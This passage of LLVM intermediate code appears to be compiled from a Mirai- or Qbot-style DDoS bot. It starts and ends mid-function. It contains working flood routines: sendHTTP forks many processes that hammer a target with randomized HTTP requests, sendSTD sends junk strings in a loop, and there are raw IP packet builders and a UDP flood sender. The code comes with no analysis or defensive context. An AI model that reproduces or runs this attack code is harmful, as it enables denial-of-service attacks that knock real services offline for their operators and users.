  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #11 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !5

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #17
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #17
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeVSEPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #3
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #3
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #3
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %25 = sext i32 %2 to i64
  %26 = add nsw i64 %7, %25
  br label %27

; <label>:27:                                     ; preds = %42, %3
  %.0 = phi i32 [ 0, %3 ], [ %43, %42 ]
  %28 = call i32 @rand() #3
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %27
  %31 = sext i32 %28 to i64
  %32 = urem i64 %31, 36
  %33 = getelementptr inbounds [36 x i8*], [36 x i8*]* @sendSTD.randstrings, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @send(i32 %5, i8* %34, i64 50, i32 0) #3
  %36 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %24, i32 16) #3
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %26
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %30
  %41 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #16
  unreachable

; <label>:42:                                     ; preds = %30, %27
  %.1 = phi i32 [ %.0, %27 ], [ 0, %30 ]
  %43 = add i32 %.1, 1
  br label %27
}

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca [1 x i8], align 1
  %5 = alloca [512 x i8], align 16
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call i32 @getdtablesize() #3
  %9 = sdiv i32 %8, 2
  %10 = icmp sgt i32 %8, 1
  br i1 %10, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

; <label>:11:                                     ; preds = %.lr.ph
  %12 = icmp slt i32 %15, %9
  br i1 %12, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %11
  %.011 = phi i32 [ %15, %11 ], [ 0, %.lr.ph.preheader ]
  %13 = tail call i32 @fork() #3
  %14 = icmp eq i32 %13, 0
  %15 = add nuw nsw i32 %.011, 1
  br i1 %14, label %.preheader, label %11

.preheader:                                       ; preds = %.lr.ph
  %16 = trunc i32 %1 to i16
  %17 = sext i32 %2 to i64
  %18 = add nsw i64 %7, %17
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %20 = getelementptr inbounds [1 x i8], [1 x i8]* %4, i64 0, i64 0
  br label %21

; <label>:21:                                     ; preds = %.preheader, %64
  %22 = call i32 @socket_connect(i8* %0, i16 zeroext %16)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %64, label %24

; <label>:24:                                     ; preds = %21
  store i8 0, i8* %19, align 16
  %25 = call i64 @strlen(i8* nonnull %19) #14
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %25
  %27 = call i32 @rand() #3
  %28 = sext i32 %27 to i64
  %29 = urem i64 %28, 3
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.methods, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %26, i8* %31) #3
  %33 = call i64 @strlen(i8* nonnull %19) #14
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %33
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.81, i64 0, i64 0), i64 20, i32 1, i1 false)
  %35 = call i64 @strlen(i8* nonnull %19) #14
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %35
  %37 = call i8* @strcpy(i8* %36, i8* %0) #3
  %38 = call i64 @strlen(i8* nonnull %19) #14
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %38
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.82, i64 0, i64 0), i64 15, i32 1, i1 false)
  %40 = call i64 @strlen(i8* nonnull %19) #14
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %40
  %42 = call i32 @rand() #3
  %43 = and i32 %42, 31
  %44 = zext i32 %43 to i64
  %45 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %44
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @strcpy(i8* %41, i8* %46) #3
  %48 = call i64 @strlen(i8* nonnull %19) #14
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %48
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %49, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.83, i64 0, i64 0), i64 15, i32 1, i1 false)
  %50 = call i64 @strlen(i8* nonnull %19) #14
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %50
  %52 = call i32 @rand() #3
  %53 = sext i32 %52 to i64
  %54 = urem i64 %53, 3
  %55 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %51, i8* %56) #3
  %58 = call i64 @strlen(i8* nonnull %19) #14
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %58
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.84, i64 0, i64 0), i64 5, i32 1, i1 false)
  %60 = call i64 @strlen(i8* nonnull %19) #14
  %61 = call i64 @write(i32 %22, i8* nonnull %19, i64 %60) #3
  %62 = call i64 @read(i32 %22, i8* nonnull %20, i64 1) #3
  %63 = call i32 @close(i32 %22) #3
  br label %64

; <label>:64:                                     ; preds = %21, %24
  %65 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %66 = sext i32 %65 to i64
  %67 = icmp slt i64 %66, %18
  br i1 %67, label %21, label %68

; <label>:68:                                     ; preds = %64
  call void @_exit(i32 0) #16
  unreachable

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHEX(i8*, i8*, i16 zeroext, i8* nocapture readnone, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = alloca [2048 x i8], align 16
  %10 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %11 = add nsw i32 %10, %4
  %12 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %12, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.85, i64 0, i64 0), i64 265, i32 1, i1 false)
  %13 = icmp sgt i32 %5, 0
  br i1 %13, label %.lr.ph14, label %._crit_edge15

.lr.ph14:                                         ; preds = %6
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %17

; <label>:15:                                     ; preds = %17
  %16 = icmp slt i32 %26, %5
  br i1 %16, label %17, label %._crit_edge15.loopexit

; <label>:17:                                     ; preds = %.lr.ph14, %15
  %.012 = phi i32 [ 0, %.lr.ph14 ], [ %26, %15 ]
  %18 = call i32 @rand() #3
  %19 = srem i32 %18, 36
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %20
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %14, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.86, i64 0, i64 0), i8* %0, i8* nonnull %12, i8* %1, i8* %22)
  %24 = call i32 @fork() #3
  %25 = icmp eq i32 %24, 0
  %26 = add nuw nsw i32 %.012, 1
  br i1 %25, label %15, label %.preheader

.preheader:                                       ; preds = %17
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = icmp sgt i32 %11, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %14) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %14, i64 %34) #3
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #3
  %37 = call i32 @close(i32 %31) #3
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %39 = icmp sgt i32 %11, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  call void @exit(i32 0) #16
  unreachable

._crit_edge15.loopexit:                           ; preds = %15
  br label %._crit_edge15

._crit_edge15:                                    ; preds = %._crit_edge15.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #17
  br label %19

; <label>:19:                                     ; preds = %16, %13
